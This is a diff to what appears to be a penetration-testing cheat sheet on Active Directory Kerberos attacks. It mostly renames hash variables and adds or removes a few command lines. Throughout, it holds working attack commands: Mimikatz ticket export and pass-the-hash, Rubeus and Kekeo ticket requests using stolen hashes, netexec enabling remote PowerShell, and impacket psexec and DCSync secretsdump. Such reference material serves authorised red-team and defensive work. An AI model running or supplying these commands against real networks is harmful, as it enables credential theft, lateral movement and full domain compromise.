@@ -28,6 +28,8 @@
 privilege::debug
 sekurlsa::tickets /export
 # Output: [0;xxxxx]-2-0-xxxxxxxx-username@service-domain.kirbi
+
+kerberos::list /export
 ```
 
 ```bash [SharpKatz (less detected)]
@@ -97,18 +99,21 @@ SharpKatz.exe --Command sekurlsa::ekeys
 ::: code-group
 
 ```bash [Rubeus (recommended)]
-Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NTLM_HASH /ptt
+Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NT_HASH /ptt
 Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$AES256_HMAC /ptt
 ```
 
 ```bash [Kekeo]
-kekeo.exe "tgt::ask /user:$USER /domain:$DOMAIN /rc4:$HASH" "exit"
+kekeo.exe "tgt::ask /user:$USER /domain:$DOMAIN /rc4:$NT_HASH" "exit"
 kekeo.exe "kerberos::ptt ticket.kirbi" "exit"
 ```
 
 ```bash [Mimikatz (creates new window)]
-sekurlsa::pth /domain:$DOMAIN /user:$USER /ntlm:$NTLM_HASH
+sekurlsa::pth /domain:$DOMAIN /user:$USER /ntlm:$NT_HASH
 # New cmd.exe window opens - use it for lateral movement
+
+# or
+misc::cmd # change context with new cmd.exe
 ```
 
 ```bash [Rubeus - Base64 only (no import)]
@@ -184,7 +189,7 @@ Enter-PSSession -ComputerName $TARGET_IP
 
 ```bash
 # Enable remotely (requires admin on target)
-nxc winrm $TARGET_IP -u $USER -H $NTLM_HASH -x "Enable-PSRemoting -Force"
+nxc winrm $TARGET_IP -u $USER -H $NT_HASH -x "Enable-PSRemoting -Force"
 ```
 
 ### Create netonly process (Rubeus)
@@ -229,7 +234,6 @@ impacket-smbclient -k -no-pass -dc-ip "$DC_IP" "$DOMAIN/$USER@$DC_HOST"
 
 # PSExec
 impacket-psexec -k -no-pass -dc-ip "$DC_IP" "$DOMAIN/$USER@$DC_HOST"
-impacket-psexec -k -no-pass -dc-ip "$DC_HOST" @"$DC_HOST"
 
 # Secretsdump (DCSync)
 impacket-secretsdump -k -no-pass -dc-ip "$DC_IP" "$DOMAIN/$USER@$DC_HOST"
